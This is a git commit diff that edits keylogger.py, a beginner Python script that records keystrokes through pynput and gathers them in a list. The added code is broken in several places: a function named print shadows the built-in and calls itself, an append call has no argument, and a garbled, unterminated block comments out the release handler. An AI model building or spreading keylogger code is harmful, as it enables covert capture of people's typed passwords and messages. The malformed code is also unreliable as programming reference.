8f28611144b8d244a986fbc70c40b7f015c2d543
Styvensoft <steveen.echeverri@gmail.com>
2022-10-31 23:44:58 -0500

    More delete comments

--- keylogger.py
+++ keylogger.py
@@ -1,9 +1,28 @@
 import pynput.keyboard
 
+key_list = []
+
+def print():
+    key = ''.join(key_list)
+    print(key)
+
 def press(key):
     key1 = convertOne(key)
-    print("Tecla {}".format(key1))
+    # print("Tecla {}".format(key1))
 
+    if key1 == 'Key.esc':
+        print('Exit...')
+
+    elif key1 == 'key.space':
+        key_list.append()
+
+    else:
+        key_list.append(key1)
+
+'''
+
+if key1 === 'Kay.space
+:
 def release(key):
     key1 = convertOne(key)
     print("Tecla rel {}".format(key1))
@@ -11,6 +30,7 @@ def release(key):
     if str(key) == "Key.esc":
         print("Exit...")
         return False
+'''
 
 def convertOne(key):
     if isinstance(key, pynput.keyboard.KeyCode):
@@ -18,5 +38,5 @@ def convertOne(key):
     else:
         return str(key)
 
-with pynput.keyboard.Listener(on_press=press, on_release=release) as listen:
+with pynput.keyboard.Listener(on_press=press) as listen:
     listen.join()
